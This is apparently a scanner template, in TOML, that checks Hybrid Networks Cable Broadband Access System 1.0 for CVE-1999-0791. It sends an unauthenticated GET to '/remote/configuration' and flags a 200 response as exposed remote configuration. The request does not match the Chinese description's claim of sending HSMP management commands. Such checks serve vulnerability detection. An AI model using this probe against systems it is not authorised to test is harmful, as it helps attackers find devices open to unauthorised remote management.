[info]
author = "ave"
description = "检测 Hybrid Networks 宽带接入系统是否存在 HSMP 协议认证绕过漏洞。通过发送未经身份验证的 HSMP 管理命令，验证系统是否允许未授权的远程管理访问。"
id = "POC-AVE-1999-0777"
name = "Hybrid Networks Cable Broadband Access System 1.0 远程配置漏洞 PoC"
severity = "critical"
tags = ["ave-1999-0777"]
vuln_id = [
    "CVE-1999-0791",
    "AVE-1999-0777",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/remote/configuration"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE-POC/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
